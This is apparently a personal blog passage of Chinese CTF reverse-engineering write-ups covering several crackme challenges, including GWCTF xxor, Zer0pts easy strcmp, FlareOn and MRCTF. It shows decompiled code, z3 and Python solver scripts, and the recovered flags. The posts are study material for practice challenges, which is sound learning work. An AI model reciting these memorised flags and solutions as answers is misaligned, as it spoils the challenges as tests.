(opcode[i]) { case 1: v4[m] = v5; ++i; ++m; ++n; break; case 2: v5 = opcode[i + 1] + flag[n]; i += 2; break; case 3: v5 = flag[n] - opcode[i + 1]; i += 2; break; case 4: v5 = opcode[i + 1] ^ flag[n]; i += 2; break; case 5: v5 = opcode[i + 1] * flag[n]; i += 2; break; case 6: ++i; break; case 7: v4[k] = opcode[i + 1]; // 打印关键数据V4 printf(&quot;%#X, &quot;, v4[k]); ++k; i += 2; break; case 8: flag[j] = v5; ++i; ++j; break; case 10: scanf(&quot;%s&quot;, flag); // 输入flag //长度是15 ++i; break; case 11: v5 = flag[n] - 1; ++i; break; case 12: v5 = flag[n] + 1; ++i; break; } order[s++] = i; } printf(&quot;\\n执行顺序是: &quot;); for (int ss = 0; ss &lt; strlen(order); ss++) { printf(&quot;%d, &quot;, order[ss]); } return 0;}int decode(int * opcode, int len_114){ int i; //获取flag 的关键数据 unsigned char v4[] = { 0X22, 0X3F, 0X34, 0X32, 0X72, 0X33, 0X18, 0XFFFFFFA7, 0X31, 0XFFFFFFF1, 0X28, 0XFFFFFF84, 0XFFFFFFC1, 0X1E, 0X7A }; //执行opcode 的索引，即执行顺序 char order[100] = { 1, 3, 4, 6, 7, 9, 10, 12, 13, 15, 16, 17, 18, 19, 20, 22, 23, 25, 26, 28, 29, 30, 31, 32, 33, 35, 36, 38, 39, 41, 42, 44, 45, 46, 47, 48, 49, 51, 52, 54, 55, 57, 58, 60, 61, 63, 64, 66, 67, 69, 70, 72, 73, 75, 76, 78, 79, 81, 82, 83, 84, 86, 88, 90, 92, 94, 96, 98, 100, 102, 104, 106, 108, 110, 112, 114 }; unsigned char flag[100] = {}; int m = 15; int n = 15; int j = 15; int v5; for (int k = strlen(order) - 1; k &gt;= 0 ; k--) { i = order[k]; switch (opcode[i]) // 倒序执行 { case 1: --m; --n; v5 = v4[m]; break; case 2: flag[n] = v5 - char(opcode[i + 1]) ; break; case 3: flag[n] = v5 + char(opcode[i + 1]); break; case 4: flag[n] = (v5 ^ opcode[i + 1]) &amp; 0XFF; break; case 5: flag[n] = v5 / opcode[i + 1]; break; case 6: break; case 8: v5 = flag[--j]; break; case 11: flag[n] = v5 + 1; break; case 12: flag[n] = v5 - 1; break; } } printf(&quot;%s&quot;, flag); return 0;}int main(){ vm_operad(a, 114); decode(a, 114); return 0;} 通过case7对比的数组v4来求出v5，即执行的顺序,然后通过v5来求出flag反向推出flag，执行顺序由后往前。 学到一招，可以把多行的数据转换成数组 https://www.52pojie.cn/thread-1187493-1-1.html 很好奇还有关于ida插件ponce的使用来解决这一道题 –待更新– [GWCTF 2019]xxor （xor plus）当初发现这个题目不是一般的难，就跳过了，这次正好来总结一下。 下载后发现是个linux文件，先放linux运行一下： 放到ida里面看一下 首先是循环输入六次，然后进入一个循环，然后sub_400686这个函数一看就是加密函数了，一参是我们输入的值，二参是一个固定数组。 2 dup(2) ,就是2出现两次的意思，上次个maze题也出现过 那这样二参我们就知道了：{2,2,3,4} 注意一下第二个循环，j循环了三次 后面的的sub_400770则是比较函数了 我们跟进： 我这边正好熟悉一下z3的用法： 12345678910111213141516from z3 import *a0,a1,a2,a3,a4,a5 = Ints('a0 a1 a2 a3 a4 a5')x = Solver()x.add(a2 - a3 == 2225223423)x.add(a3 + a4 == 4201428739)x.add(a2 - a4 == 1121399208)x.add(a0 == 3746099070)x.add(a5 == 2230518816)x.add(a1 == 550153460)print(x.check())print(x.model())unsigned lis[] = {3746099070, 550153460,3774025685,1548802262,2652626477,2230518816}; 也就是六个数字，循环三次，两两计算 v5初始等于0，那逆向就是0x40*1166789954 = 74674557056，原来每次递增，那么最后就递减 别的如果是加，那么就都减去，次序再调换一下 （貌似python对位移运算不够友善，以后做这种计算的题目还是用c吧） 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int a[] = {2,2,3,4};unsigned lis[] = {3746099070, 550153460,3774025685,1548802262,2652626477,2230518816};void function(unsigned* x){ unsigned v3 = *x; unsigned v4 = *(x + 1); int v5 = 74674557056; for (int i = 0; i &lt;= 63 ;i++){ v4 -= (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a[2]) ^ ((v3 &gt;&gt; 9) + a[3]) ^ 0x10; v3 -= (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + a[0]) ^ ((v4 &gt;&gt; 9) + a[1]) ^ 0x20; v5 -= 1166789954; } *x = v3; *(x+1) = v4;}int main(){ for (int i = 0; i &lt; 6 ;i += 2){ function(lis+i); } for (int i = 0;i &lt; 6 ;i ++) printf(&quot;%c%c%c&quot;,(lis[i] &gt;&gt; 16) &amp; 0xff,(lis[i] &gt;&gt; 8) &amp; 0xff,lis[i] &amp; 0xff); return 0;} 令我疑惑的是，为什么会有下面的操作？ 12for (int i = 0;i &lt; 6 ;i ++) printf(&quot;%c%c%c&quot;,(lis[i] &gt;&gt; 16) &amp; 0xff,(lis[i] &gt;&gt; 8) &amp; 0xff,lis[i] &amp; 0xff); 思考了一下，发现不加后面的&amp;0xff结果也一样 [WUSTCTF2020]level4（二叉树遍历）先放linux里面运行了一下 1232f0t02T{hcsiI_SwA__r7Ee}20f0Th{2tsIS_icArE}e7__w //type3(&amp;x[22]); No way! ida打开 只能理解为顺序错了，两串字符串的内容是一致的。 两个函数都是递归函数，Type1函数putchar（）在中间，Type2函数putchar（）在后面，而且上面的提示语句（Data Structure）已经告诉我们是关于数据结构的东西。我们便可以想到是树的前中后遍历，那么Type1就是中序遍历,Type2函数就是后序遍历，我们需要的就是Type3就是前序遍历，开始手动绘制…… wctf2020{This_IS_A_7reE} [ACTF新生赛2020]Universe_final_answer (z3计算) 查个壳，然后用ida64打开 跟进这个sub_860函数，就能看到一堆的方程 在网上学习了一下python中z3的基本用法 12345678910from z3 import *a,s,d = Ints('a s d')x = Solver()x.add(a-d == 18)x.add(a+s == 12)x.add(s-d == 20)x.check()x.model()print(x.model()) 下面开始着手编写对应脚本 123456789101112131415161718from z3 import *v1,v2,v3,v4,v5,v6,v7,v8,v9,v11 = Ints('v1 v2 v3 v4 v5 v6 v7 v8 v9 v11')x = Solver()x.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)x.add(30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400)x.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - v6 * 64 - 120 * v9 == -10283)x.add(71 * v6 + v7 * 128 + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855)x.add( 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944)x.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222)x.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258)x.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559)x.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308)x.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697)print(x.check())print(x.model()) 解出来之后，还需要转化一下，且注意顺序，v2是a1[0]，v6与v5的次序是对调的。 12345678910[v1 = 48, v6 = 95, v2 = 70, v4 = 82, v11 = 64, v3 = 117, v5 = 84, v7 = 121, v9 = 119, v8 = 55] 12345lis = [ 70,48,117,82,84,121,95,55,119]flag = ''for i in lis: flag+=chr(i)print(flag) F0uRTy_7w@ 所以说sub_860的值出来了，进入一个sub_C50()函数判断，我们只需要用Linux虚拟机运行一下，将我们求得的字符串带入输入到其中，使得条件成立，flag就出来了。 flag{F0uRTy_7w@_42} [UTCTF2020]basic-re (水题) 用ida64打开看看 flag{str1ngs_1s_y0ur_fr13nd} [Zer0pts2020]easy strcmp (binascii+函数变址) 查壳后用ida64打开 这题貌似没有我想的那么简单 123456789101112131415__int64 __fastcall main(int a1, char **a2, char **a3){ if ( a1 &gt; 1 ) { if ( !strcmp(a2[1], &quot;zer0pts{********CENSORED********}&quot;) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); } else { printf(&quot;Usage: %s &lt;FLAG&gt;\\n&quot;, *a2); } return 0LL;} 这边的mian函数只是一个比较的函数 参考资料：https://www.cnblogs.com/Mayfly-nymph/p/13154909.html 但是人没写怎么查找到加密输入符号的函数 这边放上z1r0的解析: https://www.zhihu.com/people/xu-xu-xuxu-94 在机智聪明，成熟老练的z1r0大佬的指导下，我逐渐摸清楚为两个函数是如何变幻的，并且还学到了很多东西，我总结一下： 在sub_795这个函数中，可以看到： qword_201090这个全局变量（在.bss表中，所以是全局变量）保存的是strcmp的地址 off_201028=sub_6EA是什么意思？我们跟进一下 首先理解一下offset是什么意思： https://blog.csdn.net/deniece1/article/details/102934346 offset为属性操作符，表示应该把其后面的符号地址的值，不是内容作为操作数，所以off_201028应该存放的是strcmp的地址 所以，off_201028 = sub_6EA，相当于把sub_6EA的地址赋值给了strcmp！！！再推理一下，全局变量qword_201090保存的是strcmp的地址，所以如果要执行strcmp函数，我们需要用qword_201090来实现。 z1r0大佬说, .plt段存放的一般是puts/printf函数，.bss存放的是全局变量，init放置的是程序初始化的代码块，.text存放代码段。 因此，在main函数中的strcmp函数，其实调用的是sub_6EA这个函数 我们跟进sub_6EA这个函数： 第一个for循环是用来测定输入字符串的长度，v4除以8再+1，相当于组数。然后第二个for循环，每组减去qword_201060这个数组，我们跟进 程序后面的qword_201090，我们推理过了，就相当于于是strcmp，用来于外面的”zer0pts{*CENSORED*}”相比较 所以我们应该是加上qword_201060的值才对，上代码： 1234567891011121314151617import binasciistring = &quot;********CENSORED********&quot;qword_201060 = [0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B]flag = b'flag{'for i in range(3): #这边就是把string均分成长度为8的三段 z = string[i * 8 : (i + 1) * 8] #这个函数就是把每一段字符串都转换为十六进制ascii码 x = binascii.b2a_hex(z.encode('ascii')[::-1]) #逆向操作，加上qword_201060中对应的值 y = binascii.a2b_hex(hex(int(x, 16) + qword_201060[i])[2:])[::-1] flag += yprint(flag + b'}') binascii.b2a_hex()函数运行之后的结果为b’4445524f534e4543’，为byte类型的字符串，所以需要转换一下，hex(x,16) 奇怪啊，为什么要把每一段字符串逆一下？([::-1]) 如果说这个是因为ida的小段存储机制，所以要逆一下，那后面求完之后的y为什么要逆一下？奇怪？？ b’flag{l3ts_m4k3_4_DETOUR_t0d4y}’ [FlareOn3]Challenge1 (base64换表)先查个壳，再用ida32打开 输入的字符串经过sub_401260函数的转换，变成了str2，然后与str1进行比较 可以看到这边是很熟悉的base64算法，我们点进去byte_413000看看 一个很经典的base64换标操作，下面是代码： 123456789101112import base64string = &quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;new_base = 'ZYXABCDEFGHIJKLMNOPQRSTUVWzy\\xabcdefghijklmnopqrstuvw0123456789+/'base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'flag = base64.b64decode(string.translate(str.maketrans(new_base,base)))print(flag) flag{sh00ting_phish_in_a_barrel@flare-on.com} [ACTF新生赛2020]Oruga（迷宫plus）oruga是什么文件？不管了，先插个壳看看 用ida64打开看看 前面五个字符告诉我们了，继续跟进sub_78A看看 再到byte_201020看看 到这就傻了，琢磨了半天…… https://www.cxybb.com/article/weixin_43876357/107525490 原来是迷宫啊，但是这个迷宫怎么用上面的查看的…… 原来下面的这个意思是代表这4个0x00的意思，那这样就能把ida中的这一组数据转换成列表了，这边我搬运的大佬z1r0的代码 1234567891011121314mz = [0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x23, 0x23, 0x23,0x00, 0x00, 0x00, 0x23, 0x23, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x50, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x4F, 0x4F, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x4C, 0x4C, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00,0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x4D, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45,0x00, 0x00, 0x00, 0x30, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x45,54, 0x54, 0x54, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00,0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00,0x00, 0x54, 0x00, 0x49, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x4D, 0x21, 0x00, 0x00, 0x00, 0x45, 0x45]for i in range(16): for j in range(16): if i == 0 and j == 0: print('V', end = ' ') elif mz[16 * i + j] == 0: print('*', end = ' ') elif mz[16 * i + j] == 0x21: print('X', end= ' ') else: print('O', end=' ') print() 还有三个问题我没有解决： 地图大小如何确定 游戏规则如何建立（碰到障碍物才能停下再继续操作） 障碍物如何显示？ 16*16 = 256，所以可以确定地图的大小 第二层while循环中就限制了移动的范围，一是在地图的边缘，而是碰到障碍物 而障碍物貌似就是第二层循环中的后面的限制条件，可以把实体化，打印出来…… flag{MEWEMEWJMEWJM} 吧 [BJDCTF2020]BJD hamburger competition（unity逆向+sha1+mod5）我惊了…… 查个壳子看看，没有壳，用ida64打开，貌似查壳+ida不是正确的打开方式 看看z1r0的博客（下面的这句话才是最装逼的，哈哈哈），用到的是dnSPY这个软件： ‘https://www.zhihu.com/people/xu-xu-xuxu-94 成功下载，并打开 https://blog.csdn.net/weixin_47158947/article/details/107818896 主要看第二点，反编译这个Assembly-CSharp.dll这个文件，直接修改unity的C#源代码 然后放到dnspy中…… 顺利找到一个BJDCTF的字眼 踩坑了，我都不知道哈希函数基本是不可逆的 看z1r0的博客才知道文中的Sha1只是判断第一个字符，我们通过这个获得了密文，接着将1001这个密文进行MOD5加密 可以看到，哈希值是下面这个，（我看z1r0的博客，会有两个值……） 不管了，继续看 作者的意图是获取mod5加密的前20个字符 12345string = 'b8c37e33defde51cf91e1e03e51657da'flag = 'flag{'+string[0:20].upper()+'}'print(flag) flag{B8C37E33DEFDE51CF91E} [WUSTCTF2020]Cr0ssfun(水题) 先查个壳，用ida64打开 可以看到v4是我们输入的flag,check函数是比较函数，我们跟进 继续跟进…… 1234_BOOL8 __fastcall iven_1s_educated(_BYTE *a1){ return *a1 == 119 &amp;&amp; a1[6] == 50 &amp;&amp; a1[22] == 115 &amp;&amp; a1[31] == 110 &amp;&amp; a1[12] == 95 &amp;&amp; (unsigned int)iven_1s_brave(a1);} 继续跟进…… 1234567891011121314151617181920212223_BOOL8 __fastcall iven_1s_brave(_BYTE *a1){ return a1[15] == 100 &amp;&amp; a1[8] == 123 &amp;&amp; a1[18] == 51 &amp;&amp; a1[28] == 95 &amp;&amp; a1[21] == 114 &amp;&amp; (unsigned int)iven_1s_great(a1);}_BOOL8 __fastcall iven_1s_great(_BYTE *a1){ return a1[2] == 116 &amp;&amp; a1[9] == 99 &amp;&amp; a1[32] == 125 &amp;&amp; a1[19] == 118 &amp;&amp; a1[5] == 48 &amp;&amp; a1[14] == 110 &amp;&amp; (unsigned int)iven_and_grace(a1);}_BOOL8 __fastcall iven_and_grace(_BYTE *a1){ return a1[4] == 50 &amp;&amp; a1[17] == 114 &amp;&amp; a1[29] == 102 &amp;&amp; a1[17] == 114 &amp;&amp; a1[24] == 95 &amp;&amp; (unsigned int)finally_fun(a1);} 这iven也太自恋了吧……下面是代码 1234567891011121314151617181920212223242526272829303132333435363738a1 = [0]*40a1[10] = 112a1[13] = 64a1[3] = 102a1[26] = 114a1[20] = 101a1[7] = 48a1[16] = 95a1[11] = 112a1[23] = 101a1[30] = 117a1[0] = 119a1[6] = 50a1[22] = 115a1[31] = 110a1[12] = 95a1[15] = 100a1[8] = 123a1[18] = 51a1[28] = 95a1[21] = 114a1[2] = 116a1[9] = 99a1[32] = 125a1[19] = 118a1[5] = 48a1[14] = 110a1[4] = 50a1[17] = 114a1[29] = 102a1[17] = 114a1[24] = 95a1[1] = 99a1[25] = 64a1[27] = 101for i in a1: print(chr(i),end = '') wctf2020{cpp*@nd_r3verse*@re_fun} [FlareOn6]Overlong(od动调) 差壳，啥意思？要用ide试试？ 我也没看出来个啥，运行了一下，到时候上ida直接查找这句话。 打开ida32查看， 123456789int __stdcall start(int a1, int a2, int a3, int a4){ CHAR Text[128]; // [esp+0h] [ebp-84h] BYREF int v6; // [esp+80h] [ebp-4h] v6 = sub_401160(Text, &amp;unk_402008, 28); Text[v6] = 0; MessageBoxA(0, Text, Caption, 0); return 0; unk_402008,中有很多数字，但最后弹出的框中，只有28个数字…… 写了很多代码之后，解不出来…… https://blog.csdn.net/P_Black_K/article/details/122342264 原来是要去用od去动调这个28啊…… 我用的是吾爱破解的od,打开后可以看到push 0x1c,而这个数字正好是28,我们做的就是去修改这个0x1c。 出来了！第一次用od动调程序！！ flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com} [GWCTF 2019]xxor (xor plus++) 先查个壳，用IDA64打开 12345678910111213// positive sp value has been detected, the output may be wrong!void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void)){ __int64 v3; // rax int v4; // esi __int64 v5; // [rsp-8h] [rbp-8h] BYREF char *retaddr; // [rsp+0h] [rbp+0h] BYREF v4 = v5; v5 = v3; __libc_start_main((int (__fastcall *)(int, char **, char **))main, v4, &amp;retaddr, init, fini, a3, &amp;v5); __halt();} 我们跟进main 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(int a1, char **a2, char **a3){ int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] __int64 v6[6]; // [rsp+10h] [rbp-60h] BYREF __int64 v7[6]; // [rsp+40h] [rbp-30h] BYREF v7[5] = __readfsqword(0x28u); puts(&quot;Let us play a game?&quot;); puts(&quot;you have six chances to input&quot;); puts(&quot;Come on!&quot;); memset(v6, 0, 40); for ( i = 0; i &lt;= 5; ++i ) { printf(&quot;%s&quot;, &quot;input: &quot;); a2 = (char **)((char *)v6 + 4 * i); __isoc99_scanf(&quot;%d&quot;); } memset(v7, 0, 40); for ( j = 0; j &lt;= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); a2 = (char **)dword_601060; sub_400686((unsigned int *)&amp;dword_601078, dword_601060);// 加密函数 LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } if ( (unsigned int)sub_400770(v7, a2) != 1 ) { puts(&quot;NO NO NO~ &quot;); exit(0); } puts(&quot;Congratulation!\\n&quot;); puts(&quot;You seccess half\\n&quot;); puts(&quot;Do not forget to change input to hex and combine~\\n&quot;); puts(&quot;ByeBye&quot;); return 0LL;} 输入六次， 先是循环三次，可以看出sub_400686是一个加密的函数 而sub_400770是一个对比的函数 123456789101112131415161718__int64 __fastcall sub_400770(_DWORD *a1){ if ( a1[2] - a1[3] == 2225223423LL &amp;&amp; a1[3] + a1[4] == 4201428739LL &amp;&amp; a1[2] - a1[4] == 1121399208LL &amp;&amp; *a1 == 3746099070 &amp;&amp; a1[5] == 2230518816 &amp;&amp; a1[1] == 550153460 ) { puts(&quot;good!&quot;); return 1LL; } else { puts(&quot;Wrong!&quot;); return 0LL; }} 加密之后的v7数组 1v7 = [3746099070,550153460,3774025685,1548802262,2652626477,2230518816] 这边可以看到，dword_601060数组为[2,2,3,4] 然后看看加密算法 12345678910111213141516171819202122__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2){ __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i &lt;= 63; ++i ) { v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result;} 好！到这边就没了，炸了！ 参考链接： https://blog.csdn.net/HardDebugger/article/details/108625220 https://www.programminghunter.com/article/3800202454/ 1234567891011121314151617from Crypto.Util.number import long_to_bytesfrom ctypes import *v6=[3746099070,550153460,3774025685,1548802262,2652626477,2230518816]unk=[2,2,3,4]for i in range(0,5,2): v5=(c_int(1166789954*0x40)) v3 = c_uint(v6[i]) v4 = c_uint(v6[i+1]) for j in range(0x40): v4.value -= ((v3.value+v5.value+20)^((v3.value&lt;&lt;6)+unk[2])^((v3.value&gt;&gt;9)+unk[3])^0x10) v3.value -= ((v4.value+v5.value+11)^((v4.value&lt;&lt;6)+unk[0])^((v4.value&gt;&gt;9)+unk[1])^0x20) v5.value = (v5.value - 1166789954) v6[i] =v3.value v6[i+1] = v4.valuefor k in range(6): print(long_to_bytes(v6[k]).decode(),end='') 分析一下这个代码： ctypes是python的外部函数库，提供与C兼容的数据类型，并允许调用DLL或共享库中的函数（我暂时不需要了解这个） 我们这边就探讨这个c_uint 这是个无符号数，对数组中的类型进行限制，限制为无符号数，最后还需要进行long_to_bytes的转换？？太强了，先放这边搁着，先下一题看看 [MRCTF2020]Xor没有壳子，直接用ida32打开。 啥情况？ 我就先用跳转，跳转到401095这个地址 进入sub_401020之后，我按了一下tab，貌似就可以反汇编了，我返回主函数看一下，成功反汇编！ 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ unsigned int i; // eax sub_401020((int)&quot;Give Me Your Flag String:\\n&quot;); sub_401050(&quot;%s&quot;, byte_4212C0); if ( strlen(byte_4212C0) != 27 ) {LABEL_6: sub_401020((int)&quot;Wrong!\\n&quot;); sub_404B7E(&quot;pause&quot;); _loaddll(0); __debugbreak(); } for ( i = 0; i &lt; 0x1B; ++i ) { if ( ((unsigned __int8)i ^ (unsigned __int8)byte_4212C0[i]) != byte_41EA08[i] ) goto LABEL_6; } sub_401020((int)&quot;Right!\\n&quot;); sub_404B7E(&quot;pause&quot;); return 0;} byte_4212C0来存放字符串，然后在后面的for语句中，与i异或之后，与byte_41EA08比较，如下所示，我们开始编写代码 奇怪了，暴力和正常的异或都没用啊，这肯定是错的…… 123456789101112string = 'SAWB~FXZ:J:`tQJ&quot;N@ bpdd}8g'print(len(string))flag = ''for i in range(26): for j in range(128): k = j if j^i == ord(string[i]): flag+=chr(k)print(flag) 发现了暗门 那是什么暗门，这个这个函数包含了我们刚刚看过的主函数 算了，看看吧…… 麻了，原来串个字符的前面有个M，没注意到，脚本编写没有问题的 123456789101112string = 'MSAWB~FXZ:J:`tQJ&quot;N@ bpdd}8g'print(len(string))flag = ''for i in range(27): for j in range(128): k = j if j^i == ord(string[i]): flag+=chr(k)print(flag) 27 MRCTF{@_R3@1ly_E2_R3verse!} [MRCTF2020]hello_world_go 没看到壳子，用ida64打开 ？？？ 下一题 [WUSTCTF2020]level3(base64换表) 用64位的IDA打开 一个base64有问题的题目 这个是 本程序里面的，我特地找了之前做过的reverse_3，纯正的base64题目，中的码表，用来做了个对比 这边是少了个=号，base62倒是可以解出来，结果却都是数字 像我之前做过的一个换码表的题目了，我正好反过来看一看 [ACTF新生赛2020]usualCrypt这道题 刚刚试了一下，换表的话，长度相等才行……新表的明显短了，这怎样才好？？ 我懂了，题目中的表的次序换了 在table上按x，果真有引用这个的函数 123456789101112131415__int64 O_OLookAtYou(){ __int64 result; // rax char v1; // [rsp+1h] [rbp-5h] int i; // [rsp+2h] [rbp-4h] for ( i = 0; i &lt;= 9; ++i ) { v1 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v1; } return result;} 这就简单了，换表之后，就能解码了，下面就是代码： 1234567891011121314import base64string = 'd2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD=='base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='newbase = list('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')for i in range(0,9): newbase[i] , newbase[19-i] = newbase[19-i] , newbase[i]newbase = ''.join(newbase)flag = base64.b64decode(string.translate(str.maketrans(newbase,base)))print(flag) b’wctf2020{Base64_is_the_start_of_reverse}’ [FlareOn4]IgniteMe()先查个壳，发现没有壳，用32位IDA打开 123456789101112131415void __noreturn start(){ DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 19u, &amp;NumberOfBytesWritten, 0); sub_4010F0(); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 10u, &amp;NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 36u, &amp;NumberOfBytesWritten, 0); ExitProcess(0);} 一眼看出if语句是用来判断的，我们跟进这个sub_401050()函数 123456789101112131415161718192021int sub_401050(){ int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = my_return_i(my_arr); v4 = my_rol(); for ( i = v1 - 1; i &gt;= 0; --i ) { my_flag[i] = v4 ^ my_arr[i]; v4 = my_arr[i]; } for ( j = 0; j &lt; 39; ++j ) { if ( my_flag[j] != model[j] ) return 0; } return 1;} 判断数组我命名成为model，转换后的数组我命名成my_flag,而中间的转换数组，我命名成为my_arr 1234567891011121314151617181920212223242526int sub_4010F0(){ unsigned int v0; // eax char Buffer[260]; // [esp+0h] [ebp-110h] BYREF DWORD NumberOfBytesRead; // [esp+104h] [ebp-Ch] BYREF unsigned int i; // [esp+108h] [ebp-8h] char v5; // [esp+10Fh] [ebp-1h] v5 = 0; for ( i = 0; i &lt; 260; ++i ) Buffer[i] = 0; ReadFile(hFile, Buffer, 260u, &amp;NumberOfBytesRead, 0); for ( i = 0; ; ++i ) { v0 = my_return_i(Buffer); if ( i &gt;= v0 ) break; v5 = Buffer[i]; if ( v5 != '\\n' &amp;&amp; v5 != '\\r' ) { if ( v5 ) my_arr[i] = v5; } } return 1;} 发现在判断函数的上面的sub_4010F0()函数，已经开辟了my_arr数组了， 可以推理出my_arr里面的元素都是0，总数没细看，再回到判断函数。 v4 =的这个函数，我给它命名为my_rol,我属实没看懂这个是什么意思 1234__int16 sub_401000(){ return __ROL4__(2147942400, 4) &gt;&gt; 1;} 我假设就是向左移动一位的意思，为1,073,971,200 那也就是v4 = 1,073,971,200,i = v1 - 1,那么这个v1我猜是40 看了人家的脚本之后，v4=4?? 这是我没想到的，差别大了…… 123456789101112131415161718model = [0x0D,0x26,0x49,0x45,0x2A,0x17,0x78,0x44,0x2B,0x6C,0x5D,0x5E,0x45,0x12,0x2F,0x17,0x2B,0x44,0x6F,0x6E,0x56,0x09,0x5F,0x45,0x47,0x73,0x26,0x0A,0x0D,0x13,0x17,0x48,0x42,0x01,0x40,0x4D,0x0C,0x02,0x69]print(model)v4 = 4my_flag = []for i in range(38,-1,-1): my_flag.append(model[i]^v4) v4 = my_flag[-1]flag = ''for i in my_flag: 